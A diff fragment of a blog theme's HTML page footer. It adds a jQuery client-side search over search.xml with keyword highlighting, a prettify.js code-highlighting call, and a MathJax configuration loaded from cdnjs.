+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+</body>
+</html>
